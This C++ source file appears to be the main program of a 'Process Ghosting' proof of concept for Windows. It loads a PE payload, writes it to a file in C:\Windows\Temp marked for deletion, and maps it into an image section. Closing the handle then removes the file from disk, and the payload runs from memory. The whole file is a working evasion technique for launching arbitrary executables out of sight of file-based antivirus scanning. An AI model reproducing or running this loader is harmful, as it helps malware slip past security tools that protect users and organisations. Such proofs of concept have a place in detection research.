#include "Common.hpp"
#include "PayloadManager.hpp"
#include "FileGhoster.hpp"
#include "SectionManager.hpp"
#include "ProcessExecutor.hpp"
#include <iostream>
#include <string>

int main(int argc, char *argv[])
{
    // 1. Configuration
    // Change this to the path of your target PE file
    std::string payloadPath = "payload.exe";
    std::wstring ghostFilePath = L"C:\\Windows\\Temp\\ghost_payload.bin";

    std::cout << "[*] Initializing Process Ghosting PoC..." << std::endl;

    // 2. Resolve Native APIs from ntdll.dll
    if (!DynamicNT::Instance().Initialize())
    {
        std::cerr << "[-] Failed to resolve NTAPI functions. Exiting." << std::endl;
        return 1;
    }
    std::cout << "[+] NTAPI functions resolved successfully." << std::endl;

    // 3. Load and Validate Payload
    std::vector<uint8_t> payload = PayloadManager::LoadPayload(payloadPath);
    if (payload.empty())
    {
        std::cerr << "[-] Could not load payload file." << std::endl;
        return 1;
    }

    if (!PayloadManager::ValidatePE(payload))
    {
        std::cerr << "[-] Payload is not a valid PE file." << std::endl;
        return 1;
    }

    uint32_t entryPoint = PayloadManager::GetEntryPoint(payload);
    std::cout << "[+] Payload validated. Entry Point RVA: 0x" << std::hex << entryPoint << std::dec << std::endl;

    // 4. Create Ghost File and Write Payload
    // This creates the file and marks it for deletion
    HANDLE hGhostFile = FileGhoster::CreateGhostFile(ghostFilePath);
    if (hGhostFile == INVALID_HANDLE_VALUE)
    {
        return 1;
    }

    if (!FileGhoster::WritePayloadToFile(hGhostFile, payload))
    {
        FileGhoster::CloseGhostFile(hGhostFile);
        return 1;
    }

    // 5. Create Image Section
    // We must do this while the file handle is still open
    HANDLE hSection = SectionManager::CreateImageSection(hGhostFile);
    if (!hSection)
    {
        FileGhoster::CloseGhostFile(hGhostFile);
        return 1;
    }

    // 6. TRIGGER GHOSTING: Close the file handle
    // Because the file was marked for deletion, closing the handle now
    // removes the file from the disk. The section handle still maintains
    // a reference to the data in memory.
    FileGhoster::CloseGhostFile(hGhostFile);

    // 7. Execute the Payload
    // This creates the process and thread from the remaining memory section
    if (ProcessExecutor::Run(hSection, entryPoint, ghostFilePath))
    {
        std::cout << "[***] Process Ghosting successful! Payload is running." << std::endl;
    }
    else
    {
        std::cerr << "[-] Payload execution failed." << std::endl;
    }

    // Cleanup section handle
    if (hSection)
    {
        CloseHandle(hSection);
    }

    std::cout << "[*] Execution complete. Press Enter to exit..." << std::endl;
    std::cin.get();

    return 0;
}
